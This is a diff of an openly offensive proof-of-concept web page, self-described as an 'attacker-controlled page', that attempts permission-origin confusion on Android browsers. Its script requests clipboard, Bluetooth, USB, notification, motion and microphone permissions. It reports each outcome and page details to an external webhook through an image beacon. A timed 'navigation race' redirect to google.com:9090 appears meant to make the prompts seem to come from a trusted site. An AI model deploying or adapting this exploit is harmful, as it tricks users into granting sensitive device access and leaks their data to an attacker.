@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Permission Origin Desync PoC Final</title>
+<title>Permission Origin Confusion PoC Android</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <style>
 body{margin:0;font-family:-apple-system,BlinkMacSystemFont,system-ui;background:#f5f5f7;text-align:center}
@@ -14,7 +14,7 @@ button{font-size:15px;padding:12px 16px;border-radius:12px;border:none;backgroun
 
 <body>
 
-<h2 style="margin-top:60px;">Permission Origin Confusion PoC Final</h2>
+<h2 style="margin-top:60px;">Permission Origin Confusion PoC Android</h2>
 <p>Attacker-controlled page</p>
 
 <button id="start">Start PoC</button>
@@ -54,7 +54,7 @@ function sendProofGET(status){
   const conn = navigator.connection || {};
 
   const params = new URLSearchParams({
-    poc: 'permission-origin-desync',
+    poc: 'permission-origin-desync-android',
     permission: status,
     attacker_origin: location.origin,
     attacker_url: location.href,
@@ -85,13 +85,12 @@ function sendProofGET(status){
   });
 
   const img = new Image();
-  img.src = WEBHOOK+'?'+params.toString()+'&poc_version=final&demo_intent=origin_confusion&marker=END';
+  img.src = WEBHOOK+'?'+params.toString()+'&poc_version=final_android&demo_intent=origin_confusion&marker=END';
 }
 
 /* ================= PERMISSION FUNCTIONS ================= */
-
 function reqMotion(){
-  if(typeof DeviceMotionEvent?.requestPermission === 'function'){
+  if(typeof DeviceMotionEvent?.requestPermission==='function'){
     DeviceMotionEvent.requestPermission()
       .then(res=>{ output.textContent='Motion: '+res; sendProofGET('motion_'+res); })
       .catch(()=>{ output.textContent='Motion denied'; sendProofGET('motion_denied'); });
@@ -125,34 +124,28 @@ function reqMic(){
 
 function reqNotify(){
   if("Notification" in window){
-    Notification.requestPermission().then(res=>{
-      output.textContent='Notification: '+res; sendProofGET('notif_'+res);
-    });
+    Notification.requestPermission().then(res=>{ output.textContent='Notification: '+res; sendProofGET('notif_'+res); });
   }else{ sendProofGET('notif_unsupported'); }
 }
 
 async function reqClipboard(){
-  try{
-    await navigator.clipboard.readText();
-    output.textContent='Clipboard granted'; sendProofGET('clipboard_granted');
-  }catch{
-    output.textContent='Clipboard denied'; sendProofGET('clipboard_denied');
-  }
+  try{ await navigator.clipboard.readText(); output.textContent='Clipboard granted'; sendProofGET('clipboard_granted'); }
+  catch{ output.textContent='Clipboard denied'; sendProofGET('clipboard_denied'); }
 }
 
 async function reqBluetooth(){
   if(navigator.bluetooth){
     try{ await navigator.bluetooth.requestDevice({acceptAllDevices:true});
-      output.textContent='Bluetooth granted'; sendProofGET('bluetooth_granted');
-    }catch{ output.textContent='Bluetooth denied'; sendProofGET('bluetooth_denied'); }
+      output.textContent='Bluetooth granted'; sendProofGET('bluetooth_granted'); }
+    catch{ output.textContent='Bluetooth denied'; sendProofGET('bluetooth_denied'); }
   }else{ sendProofGET('bluetooth_unsupported'); }
 }
 
 async function reqUSB(){
   if(navigator.usb){
     try{ await navigator.usb.requestDevice({filters:[]});
-      output.textContent='USB granted'; sendProofGET('usb_granted');
-    }catch{ output.textContent='USB denied'; sendProofGET('usb_denied'); }
+      output.textContent='USB granted'; sendProofGET('usb_granted'); }
+    catch{ output.textContent='USB denied'; sendProofGET('usb_denied'); }
   }else{ sendProofGET('usb_unsupported'); }
 }
 
@@ -173,9 +166,7 @@ document.getElementById('start').onclick = () => {
 /* Navigation race */
 window.addEventListener('pageshow', () => {
   requestAnimationFrame(()=>{ requestAnimationFrame(()=>{
-    setTimeout(()=>{
-      location.href='https://google.com:9090/#https://google.com:9090';
-    },80);
+    setTimeout(()=>{ location.href='https://google.com:9090/#https://google.com:9090'; },80);
   }); });
 });
 </script>
